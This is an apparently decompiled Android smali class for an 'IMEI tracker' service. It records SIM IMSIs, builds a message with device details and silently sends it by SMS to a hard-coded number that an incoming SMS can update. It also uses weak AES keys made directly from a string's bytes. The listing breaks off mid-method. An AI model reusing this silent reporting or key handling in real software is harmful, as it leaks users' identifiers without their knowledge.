.class public Lcom/android/mms/transaction/IMEITrackerService;
.super Landroid/app/Service;
.source "IMEITrackerService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/mms/transaction/IMEITrackerService$ServiceHandler;,
        Lcom/android/mms/transaction/IMEITrackerService$MyListner;
    }
.end annotation


# static fields
.field private static final HEX:Ljava/lang/String; = "0123456789ABCDEF"

.field static IMSI_new:Ljava/lang/String; = null

.field public static final KEY_READ_WRITE:Ljava/lang/String; = "serverNo"

.field public static final MAX_RETRY_ATTEMPTS:I = 0x3

.field public static final OPCODE:Ljava/lang/String; = "op"

.field public static final OP_BOOT_COMPLETED:I = 0x1

.field public static final OP_SMS_RECEIVED:I = 0x2

.field static final PDUS_LOCAL:Ljava/lang/String; = "pduslocal"

.field public static final PREFS_READ_WRITE:Ljava/lang/String; = "imeiServerNo"

.field static messagePass:Ljava/lang/Boolean;

.field static message_decrypted:Ljava/lang/String;

.field static message_encrypted:Ljava/lang/String;

.field public static msgSendingAttempt:I

.field static operatorName:Ljava/lang/String;

.field static sInstance:Lcom/android/mms/transaction/IMEITrackerService;


# instance fields
.field final defaultServerNo:Ljava/lang/String;

.field public insertedSimRecordList:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private mContext:Landroid/content/Context;

.field private volatile mServiceHandler:Lcom/android/mms/transaction/IMEITrackerService$ServiceHandler;

.field private volatile mServiceLooper:Landroid/os/Looper;

.field final numberOfSIM:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    .line 69
    const/4 v0, 0x0

    sput-object v0, Lcom/android/mms/transaction/IMEITrackerService;->sInstance:Lcom/android/mms/transaction/IMEITrackerService;

    .line 71
    const-string v0, ""

    sput-object v0, Lcom/android/mms/transaction/IMEITrackerService;->operatorName:Ljava/lang/String;

    .line 72
    const-string v0, ""

    sput-object v0, Lcom/android/mms/transaction/IMEITrackerService;->IMSI_new:Ljava/lang/String;

    .line 73
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/android/mms/transaction/IMEITrackerService;->messagePass:Ljava/lang/Boolean;

    .line 76
    const-string v0, " "

    sput-object v0, Lcom/android/mms/transaction/IMEITrackerService;->message_encrypted:Ljava/lang/String;

    .line 77
    const-string v0, " "

    sput-object v0, Lcom/android/mms/transaction/IMEITrackerService;->message_decrypted:Ljava/lang/String;

    .line 79
    sput v1, Lcom/android/mms/transaction/IMEITrackerService;->msgSendingAttempt:I

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 60
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 61
    const-string v0, "+919560345888"

    iput-object v0, p0, Lcom/android/mms/transaction/IMEITrackerService;->defaultServerNo:Ljava/lang/String;

    .line 62
    const-string v0, "1"

    iput-object v0, p0, Lcom/android/mms/transaction/IMEITrackerService;->numberOfSIM:Ljava/lang/String;

    .line 64
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/android/mms/transaction/IMEITrackerService;->mContext:Landroid/content/Context;

    .line 634
    return-void
.end method

.method static synthetic access$100(Lcom/android/mms/transaction/IMEITrackerService;)Ljava/lang/String;
    .locals 1
    .parameter "x0"

    .prologue
    .line 60
    invoke-direct {p0}, Lcom/android/mms/transaction/IMEITrackerService;->getServerNumbFromLocalSharePref()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$200(Lcom/android/mms/transaction/IMEITrackerService;Ljava/lang/String;)V
    .locals 0
    .parameter "x0"
    .parameter "x1"

    .prologue
    .line 60
    invoke-direct {p0, p1}, Lcom/android/mms/transaction/IMEITrackerService;->updateServerNumbToLocalSharePref(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$300(Lcom/android/mms/transaction/IMEITrackerService;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .parameter "x0"
    .parameter "x1"
    .parameter "x2"

    .prologue
    .line 60
    invoke-direct {p0, p1, p2}, Lcom/android/mms/transaction/IMEITrackerService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$400(Lcom/android/mms/transaction/IMEITrackerService;Ljava/util/ArrayList;)V
    .locals 0
    .parameter "x0"
    .parameter "x1"

    .prologue
    .line 60
    invoke-direct {p0, p1}, Lcom/android/mms/transaction/IMEITrackerService;->updateRecord(Ljava/util/ArrayList;)V

    return-void
.end method

.method private static appendHex(Ljava/lang/StringBuffer;B)V
    .locals 3
    .parameter "sb"
    .parameter "b"

    .prologue
    .line 569
    const-string v0, "0123456789ABCDEF"

    shr-int/lit8 v1, p1, 0x4

    and-int/lit8 v1, v1, 0xf

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v0

    invoke-virtual {p0, v0}, Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;

    move-result-object v0

    const-string v1, "0123456789ABCDEF"

    and-int/lit8 v2, p1, 0xf

    invoke-virtual {v1, v2}, Ljava/lang/String;->charAt(I)C

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;

    .line 570
    return-void
.end method

.method public static decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .parameter "seed"
    .parameter "encrypted"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 572
    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    .line 573
    .local v1, rawKey:[B
    invoke-static {p1}, Lcom/android/mms/transaction/IMEITrackerService;->toByte(Ljava/lang/String;)[B

    move-result-object v0

    .line 574
    .local v0, enc:[B
    invoke-static {v1, v0}, Lcom/android/mms/transaction/IMEITrackerService;->decrypt([B[B)[B

    move-result-object v2

    .line 575
    .local v2, result:[B
    new-instance v3, Ljava/lang/String;

    invoke-direct {v3, v2}, Ljava/lang/String;-><init>([B)V

    return-object v3
.end method

.method private static decrypt([B[B)[B
    .locals 4
    .parameter "raw"
    .parameter "encrypted"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 578
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    const-string v3, "AES"

    invoke-direct {v2, p0, v3}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 579
    .local v2, skeySpec:Ljavax/crypto/spec/SecretKeySpec;
    const-string v3, "AES"

    invoke-static {v3}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 580
    .local v0, cipher:Ljavax/crypto/Cipher;
    const/4 v3, 0x2

    invoke-virtual {v0, v3, v2}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 581
    invoke-virtual {v0, p1}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v1

    .line 582
    .local v1, decrypted:[B
    return-object v1
.end method

.method public static encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .parameter "seed"
    .parameter "cleartext"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 531
    const-string v2, "ITS"

    const-string v3, "encrypt"

    invoke-static {v2, v3}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 532
    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    .line 533
    .local v0, rawKey:[B
    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    invoke-static {v0, v2}, Lcom/android/mms/transaction/IMEITrackerService;->encrypt([B[B)[B

    move-result-object v1

    .line 534
    .local v1, result:[B
    invoke-static {v1}, Lcom/android/mms/transaction/IMEITrackerService;->toHex([B)Ljava/lang/String;

    move-result-object v2

    return-object v2
.end method

.method private static encrypt([B[B)[B
    .locals 5
    .parameter "raw"
    .parameter "clear"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 548
    const-string v3, "ITS"

    const-string v4, "encrypt2"

    invoke-static {v3, v4}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 549
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    const-string v3, "AES"

    invoke-direct {v2, p0, v3}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 550
    .local v2, skeySpec:Ljavax/crypto/spec/SecretKeySpec;
    const-string v3, "AES"

    invoke-static {v3}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 551
    .local v0, cipher:Ljavax/crypto/Cipher;
    const/4 v3, 0x1

    invoke-virtual {v0, v3, v2}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 552
    invoke-virtual {v0, p1}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v1

    .line 553
    .local v1, encrypted:[B
    return-object v1
.end method

.method private getIMSI(I)Ljava/lang/String;
    .locals 4
    .parameter "order"

    .prologue
    .line 462
    const-string v2, "IMEITrackerPrefs"

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Landroid/content/ContextWrapper;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 464
    .local v1, setting1:Landroid/content/SharedPreferences;
    const-string v0, "NULL"

    .line 465
    .local v0, IMSI_saved:Ljava/lang/String;
    packed-switch p1, :pswitch_data_0

    .line 484
    :goto_0
    return-object v0

    .line 467
    :pswitch_0
    const-string v2, "IMSI_FIRST"

    const-string v3, "NULL"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 468
    goto :goto_0

    .line 470
    :pswitch_1
    const-string v2, "IMSI_SECOND"

    const-string v3, "NULL"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 471
    goto :goto_0

    .line 473
    :pswitch_2
    const-string v2, "IMSI_THIRD"

    const-string v3, "NULL"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 474
    goto :goto_0

    .line 476
    :pswitch_3
    const-string v2, "IMSI_FOURTH"

    const-string v3, "NULL"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 477
    goto :goto_0

    .line 479
    :pswitch_4
    const-string v2, "IMSI_LAST"

    const-string v3, "NULL"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 480
    goto :goto_0

    .line 465
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
    .end packed-switch
.end method

.method static getInstance()Lcom/android/mms/transaction/IMEITrackerService;
    .locals 2

    .prologue
    .line 618
    const-string v0, "ITS"

    const-string v1, "getInstance"

    invoke-static {v0, v1}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 619
    sget-object v0, Lcom/android/mms/transaction/IMEITrackerService;->sInstance:Lcom/android/mms/transaction/IMEITrackerService;

    return-object v0
.end method

.method public static final getMessagesFromIntent(Landroid/content/Intent;)[Landroid/telephony/SmsMessage;
    .locals 8
    .parameter "intent"

    .prologue
    const/4 v2, 0x0

    .line 205
    const-string v6, "ITS"

    const-string v7, "getMessagesFromIntent enter"

    invoke-static {v6, v7}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 206
    const-string v6, "pduslocal"

    invoke-virtual {p0, v6}, Landroid/content/Intent;->getSerializableExtra(Ljava/lang/String;)Ljava/io/Serializable;

    move-result-object v6

    check-cast v6, [Ljava/lang/Object;

    move-object v1, v6

    check-cast v1, [Ljava/lang/Object;

    .line 207
    .local v1, messages:[Ljava/lang/Object;
    if-nez v1, :cond_1

    .line 230
    :cond_0
    :goto_0
    return-object v2

    .line 210
    :cond_1
    array-length v6, v1

    if-eqz v6, :cond_0

    .line 214
    array-length v6, v1

    new-array v4, v6, [[B

    .line 216
    .local v4, pduObjs:[[B
    const/4 v0, 0x0

    .local v0, i:I
    :goto_1
    array-length v6, v1

    if-ge v0, v6, :cond_2

    .line 217
    aget-object v6, v1, v0

    check-cast v6, [B

    check-cast v6, [B

    aput-object v6, v4, v0

    .line 216
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    .line 220
    :cond_2
    array-length v6, v4

    new-array v5, v6, [[B

    .line 222
    .local v5, pdus:[[B
    array-length v3, v5

    .line 224
    .local v3, pduCount:I
    new-array v2, v3, [Landroid/telephony/SmsMessage;

    .line 225
    .local v2, msgs:[Landroid/telephony/SmsMessage;
    const/4 v0, 0x0

    :goto_2
    if-ge v0, v3, :cond_3

    .line 226
    aget-object v6, v4, v0

    aput-object v6, v5, v0

    .line 227
    aget-object v6, v5, v0

    invoke-static {v6}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v6

    aput-object v6, v2, v0

    .line 225
    add-int/lit8 v0, v0, 0x1

    goto :goto_2

    .line 229
    :cond_3
    const-string v6, "ITS"

    const-string v7, "getMessagesFromIntent exit"

    invoke-static {v6, v7}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method private static getRawKey([B)[B
    .locals 6
    .parameter "seed"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 537
    const-string v4, "ITS"

    const-string v5, "getRawKey"

    invoke-static {v4, v5}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 538
    const-string v4, "AES"

    invoke-static {v4}, Ljavax/crypto/KeyGenerator;->getInstance(Ljava/lang/String;)Ljavax/crypto/KeyGenerator;

    move-result-object v0

    .line 539
    .local v0, kgen:Ljavax/crypto/KeyGenerator;
    const-string v4, "SHA1PRNG"

    invoke-static {v4}, Ljava/security/SecureRandom;->getInstance(Ljava/lang/String;)Ljava/security/SecureRandom;

    move-result-object v3

    .line 540
    .local v3, sr:Ljava/security/SecureRandom;
    invoke-virtual {v3, p0}, Ljava/security/SecureRandom;->setSeed([B)V

    .line 541
    const/16 v4, 0x80

    invoke-virtual {v0, v4, v3}, Ljavax/crypto/KeyGenerator;->init(ILjava/security/SecureRandom;)V

    .line 542
    invoke-virtual {v0}, Ljavax/crypto/KeyGenerator;->generateKey()Ljavax/crypto/SecretKey;

    move-result-object v2

    .line 543
    .local v2, skey:Ljavax/crypto/SecretKey;
    invoke-interface {v2}, Ljavax/crypto/SecretKey;->getEncoded()[B

    move-result-object v1

    .line 544
    .local v1, raw:[B
    return-object v1
.end method

.method private getServerNumbFromLocalSharePref()Ljava/lang/String;
    .locals 4

    .prologue
    .line 516
    const-string v2, "IMEITrackerPrefs"

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Landroid/content/ContextWrapper;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 518
    .local v1, setting1:Landroid/content/SharedPreferences;
    const-string v2, "SERVER_NUMBER"

    const-string v3, "NULL"

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 519
    .local v0, serverNumber:Ljava/lang/String;
    return-object v0
.end method

.method private sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 10
    .parameter "phoneNumber"
    .parameter "message"

    .prologue
    const/4 v2, 0x0

    .line 349
    move-object v7, p2

    .line 350
    .local v7, IMEITrackermessage:Ljava/lang/String;
    move-object v8, p1

    .line 351
    .local v8, IMEITrackerserverNo:Ljava/lang/String;
    const-string v9, "SMS_SENT"

    .line 352
    .local v9, SENT:Ljava/lang/String;
    const-string v6, "SMS_DELIVERED"

    .line 354
    .local v6, DELIVERED:Ljava/lang/String;
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p0, v2, v1, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    .line 357
    .local v4, sentPI:Landroid/app/PendingIntent;
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p0, v2, v1, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    .line 361
    .local v5, deliveredPI:Landroid/app/PendingIntent;
    new-instance v1, Lcom/android/mms/transaction/IMEITrackerService$1;

    invoke-direct {v1, p0, v8, v7}, Lcom/android/mms/transaction/IMEITrackerService$1;-><init>(Lcom/android/mms/transaction/IMEITrackerService;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v2, Landroid/content/IntentFilter;

    invoke-direct {v2, v9}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v1, v2}, Landroid/content/ContextWrapper;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 398
    new-instance v1, Lcom/android/mms/transaction/IMEITrackerService$2;

    invoke-direct {v1, p0}, Lcom/android/mms/transaction/IMEITrackerService$2;-><init>(Lcom/android/mms/transaction/IMEITrackerService;)V

    new-instance v2, Landroid/content/IntentFilter;

    invoke-direct {v2, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v1, v2}, Landroid/content/ContextWrapper;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 414
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 415
    .local v0, sms:Landroid/telephony/SmsManager;
    const/4 v2, 0x0

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 416
    const-string v1, "ITS"

    const-string v2, "sendTextMessage"

    invoke-static {v1, v2}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 417
    return-void
.end method

.method public static toByte(Ljava/lang/String;)[B
    .locals 5
    .parameter "hexString"

    .prologue
    .line 585
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    div-int/lit8 v1, v3, 0x2

    .line 586
    .local v1, len:I
    new-array v2, v1, [B

    .line 587
    .local v2, result:[B
    const/4 v0, 0x0

    .local v0, i:I
    :goto_0
    if-ge v0, v1, :cond_0

    .line 588
    mul-int/lit8 v3, v0, 0x2

    mul-int/lit8 v4, v0, 0x2

    add-int/lit8 v4, v4, 0x2

    invoke-virtual {p0, v3, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0x10

    invoke-static {v3, v4}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->byteValue()B

    move-result v3

    aput-byte v3, v2, v0

    .line 587
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 589
    :cond_0
    return-object v2
.end method

.method public static toHex(Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    .parameter "txt"

    .prologue
    .line 556
    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v0}, Lcom/android/mms/transaction/IMEITrackerService;->toHex([B)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public static toHex([B)Ljava/lang/String;
    .locals 3
    .parameter "buf"

    .prologue
    .line 559
    if-nez p0, :cond_0

    .line 560
    const-string v2, ""

    .line 565
    :goto_0
    return-object v2

    .line 561
    :cond_0
    new-instance v1, Ljava/lang/StringBuffer;

    array-length v2, p0

    mul-int/lit8 v2, v2, 0x2

    invoke-direct {v1, v2}, Ljava/lang/StringBuffer;-><init>(I)V

    .line 562
    .local v1, result:Ljava/lang/StringBuffer;
    const/4 v0, 0x0

    .local v0, i:I
    :goto_1
    array-length v2, p0

    if-ge v0, v2, :cond_1

    .line 563
    aget-byte v2, p0, v0

    invoke-static {v1, v2}, Lcom/android/mms/transaction/IMEITrackerService;->appendHex(Ljava/lang/StringBuffer;B)V

    .line 562
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    .line 565
    :cond_1
    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_0
.end method

.method private updateRecord(Ljava/util/ArrayList;)V
    .locals 7
    .parameter "simList"

    .prologue
    const/4 v6, 0x0

    .line 423
    const-string v4, "IMEITrackerPrefs"

    invoke-virtual {p0, v4, v6}, Landroid/content/ContextWrapper;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 425
    .local v2, settings:Landroid/content/SharedPreferences;
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 426
    .local v1, prefEditor:Landroid/content/SharedPreferences$Editor;
    invoke-virtual {p1}, Ljava/util/ArrayList;->size()I

    move-result v3

    .line 427
    .local v3, size:I
    const/4 v0, 0x1

    .local v0, i:I
    :goto_0
    if-gt v0, v3, :cond_1

    .line 428
    if-nez v1, :cond_0

    .line 429
    const-string v4, "IMEITrackerPrefs"

    invoke-virtual {p0, v4, v6}, Landroid/content/ContextWrapper;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 430
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 432
    :cond_0
    packed-switch v0, :pswitch_data_0

    .line 456
    :goto_1
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 427
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 434
    :pswitch_0
    const-string v4, "IMSI_FIRST"

    invoke-virtual {p1, v6}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v4, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_1

    .line 438
    :pswitch_1
    const-string v4, "IMSI_SECOND"

    const/4 v5, 0x1

    invoke-virtual {p1, v5}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v4, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_1

    .line 442
    :pswitch_2
    const-string v4, "IMSI_THIRD"

    const/4 v5, 0x2

    invoke-virtual {p1, v5}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v4, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_1

    .line 446
    :pswitch_3
    const-string v4, "IMSI_FOURTH"

    const/4 v5, 0x3

    invoke-virtual {p1, v5}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v4, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_1

    .line 450
    :pswitch_4
    const-string v4, "IMSI_LAST"

    const/4 v5, 0x4

    invoke-virtual {p1, v5}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v1, v4, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_1

    .line 458
    :cond_1
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 459
    return-void

    .line 432
    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
    .end packed-switch
.end method

.method private updateServerNumbToLocalSharePref(Ljava/lang/String;)V
    .locals 4
    .parameter "serverNum"

    .prologue
    .line 523
    const-string v2, "IMEITrackerPrefs"

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Landroid/content/ContextWrapper;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 525
    .local v1, settings:Landroid/content/SharedPreferences;
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 526
    .local v0, prefEditor:Landroid/content/SharedPreferences$Editor;
    const-string v2, "SERVER_NUMBER"

    invoke-interface {v0, v2, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 527
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 528
    return-void
.end method

.method private waitForLooper()V
    .locals 2

    .prologue
    .line 623
    const-string v0, "ITS"

    const-string v1, "waitForLooper"

    invoke-static {v0, v1}, Lcom/android/mms/Log;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 624
    :goto_0
    iget-object v0, p0, Lcom/android/mms/transaction/IMEITrackerService;->mServiceHandler:Lcom/android/mms/transaction/IMEITrackerService$ServiceHandler;

    if-nez v0, :cond_0

    .line 625
    monitor-enter p0

    .line 627
    const-wide/16 v0, 0x64

    :try_start_0
    invoke-virtual {p0, v0, v1}, Ljava/lang/Object;->wait(J)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 630
    :goto_1
    :try_start_1
    monitor-exit p0

    goto :goto_0

    :catchall_0
    move-exception v0

    monitor-exit p0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    throw v0

    .line 628
    :catch_0
    move-exception v0

    goto :goto_1

    .line 632
    :cond_0
    return-void
.end method


# virtual methods
.method public createMessage()Ljava/lang/String;
    .locals 15

    .prologue
    const/4 v14, 0x3

    .line 234
    sget-object v8, Landroid/os/Build;->MODEL:Ljava/lang/String;

    .line 236
    .local v8, modelNumber:Ljava/lang/String;
    invoke-virtual {v8}, Ljava/lang/String;->length()I

    move-result v12

    add-int/lit8 v12, v12, -0x3

    invoke-virtual {v8}, Ljava/lang/String;->length()I

    move-result v13

    invoke-virtual {v8, v12, v13}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v4

    .line 237
    .local v4, lastDigit:Ljava/lang/String;
    const-string v12, "gsm.version.baseband"

    invoke-static {v12}, Landroid/os/SystemProperties;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 238
    .local v2, baseBandVersion1:Ljava/lang/String;
    invoke-virtual {v2, v4}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v3

    .line 240
    .local v3, index:I
    const/4 v1, 0x0

    .line 241
    .local v1, baseBandVersion:Ljava/lang/String;
    if-eqz v2, :cond_0

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v12

    const/4 v13, 0x5

    if-le v12, v13, :cond_0

    .line 242
    add-int/lit8 v12, v3, 0x3

    invoke-virtual {v2, v12}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v1

    .line 251
    :cond_0
    sget v10, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 253
    .local v10, plarFormVersion:I
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "1"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " "

